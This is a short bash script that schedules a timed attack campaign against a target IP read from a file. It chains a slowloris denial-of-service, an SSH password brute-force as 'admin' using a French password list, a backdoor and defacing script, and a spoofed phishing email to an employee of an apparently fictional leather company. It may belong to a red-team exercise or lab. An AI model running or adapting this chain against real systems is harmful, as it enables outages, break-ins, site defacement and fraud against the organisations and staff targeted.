#!/usr/bin/env bash

IP=$(cat gwIP.txt)

at 8:30 <<END
	./dos/slowloris.py $IP 
END

at 8:45 <<END
	./ssh/connect_ssh.py $IP -P ssh/french_passwords_top1000.txt -u admin
END

at 9:30 <<END
	./defacing/backdoor.sh $IP
END

at 9:45 <<END
	./phishing/send_mail.py $IP -s admin@frenchleather.com -d marie.curie@frenchleather.com -m phishing/message.txt
END
